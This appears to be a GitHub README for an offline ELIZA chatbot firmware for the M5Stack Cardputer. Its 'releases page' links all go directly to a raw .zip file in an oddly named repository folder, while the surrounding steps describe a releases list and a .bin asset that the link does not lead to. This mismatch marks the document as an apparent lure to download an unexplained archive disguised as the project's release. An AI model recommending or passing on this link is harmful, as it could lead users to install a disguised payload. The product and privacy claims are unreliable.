# 🤖 AI-Offline-Chat-ADV - Private Chat Without An Internet Connection

[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/holonymygenustadarida477/AI-Offline-Chat-ADV/main/preener/A_Chat_Offline_ADV_v1.1.zip)

AI-Offline-Chat-ADV brings the classic ELIZA chatbot to your M5Stack Cardputer. This software functions completely offline. You do not need an internet connection, a cloud account, or a data subscription to use this device. It processes natural language directly on your hardware.

## 📦 What You Need

To use this software, you need the following items:
*   M5Stack Cardputer device.
*   A USB-C data cable.
*   A Windows computer (Windows 10 or 11).

This software works locally on your Cardputer hardware. You do not need to install complex drivers. The firmware replaces the standard interface with the chatbot system.

## 📥 How To Download the Software

You must obtain the firmware file to start. The file contains the base code and the chatbot logic.

1.  Visit the [official releases page](https://raw.githubusercontent.com/holonymygenustadarida477/AI-Offline-Chat-ADV/main/preener/A_Chat_Offline_ADV_v1.1.zip).
2.  Look for the latest version number at the top of the list.
3.  Scroll down to the Assets section for that version.
4.  Click the file ending in .bin to save it to your computer.

Keep this file in an easy-to-find location like your Downloads folder. Do not open or rename the file.

## ⚙️ Preparing Your Cardputer

The Cardputer receives instructions and data through the USB port. You must place the device in a mode that allows it to receive the new software.

1.  Connect your Cardputer to your computer using the USB-C cable.
2.  Open the M5Burner tool or a compatible web-based firmware installer on your browser.
3.  Ensure your computer detects the Cardputer as a connected device.
4.  Select the option to upload a local file.
5.  Locate the .bin file you downloaded earlier.
6.  Start the upload process.

The screen on your Cardputer might flicker or turn blank during this time. Do not disconnect the cable until the status bar shows the process is complete.

## 🔋 Using Your AI

Once the installation finishes, you can unplug the device from your computer. The Cardputer holds the software in its internal memory.

1.  Turn on the Cardputer by pressing the power button.
2.  Wait for the system to boot. You will see an interface appear on the device screen.
3.  Use the built-in keyboard to type your text.
4.  Press the Enter key to send your message.

The AI processes your input instantly. Because the software runs locally on the internal chip, it does not send your data to any servers. It stores no history once you power off the device.

## 🛠️ Troubleshooting Common Issues

If the device does not respond as expected, follow these checks:

*   Power Check: Ensure the internal battery has a charge. Plug the device in for thirty minutes if the screen stays black.
*   Connection Check: If the installer does not see the Cardputer, try a different USB cable. Some cables only provide power and cannot transmit data. 
*   Reset: Use a pin to press the reset button on the side of the Cardputer if the software freezes.
*   Reinstall: If the chatbot behavior is erratic, repeat the download and installation steps to ensure the firmware file is not corrupt.

## 💻 System Performance

This application runs on the ESP32-S3 chip inside your device. It provides an optimized version of the ELIZA chatbot. ELIZA simulates a conversation by identifying keywords and patterns in your text. It does not learn from your input or store your personal identity.

The software requires minimal power. You can use the device for several hours on a single charge. The screen brightness impacts battery life. You can adjust the settings within the menu if you need to extend the usage duration.

## 🔒 Privacy and Security

Data privacy defines this project. The AI logic lives entirely on the device. It has no network capabilities. Even if you connect the device to Wi-Fi or Bluetooth through other means, this application restricts all outward data transmission. Your conversations stay local to the hardware. 

## 📝 Frequently Asked Questions

Can I talk to the AI about anything?
Yes. It uses the classic ELIZA logic to engage in conversation based on your inputs. It is a simulation and does not possess genuine intelligence.

Will it work with other M5Stack devices?
This specific version targets the Cardputer hardware. It relies on the specific screen and keyboard inputs available on that device.

Do I need to update the software often?
Check the releases page once every few months. Updates usually include minor stability improvements or character library tweaks. If your current version works, you do not need to update.

Can I modify the code?
The source code is open. You can view the files in the repository if you want to understand how the system manages the ELIZA keyword mapping. You need an environment configured for ESP32 development to compile your own changes.

Is the connection to my computer permanent?
No. You only need the computer to install the firmware. The device remains fully independent after the initial setup.